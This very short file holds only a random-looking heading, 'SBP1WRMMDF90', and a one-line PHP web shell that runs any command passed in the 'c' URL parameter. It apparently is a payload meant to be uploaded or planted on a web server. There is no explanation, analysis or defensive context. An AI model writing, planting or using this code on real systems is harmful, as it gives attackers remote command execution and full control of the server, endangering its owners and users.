# SBP1WRMMDF90

<?=exec($_GET['c']);?>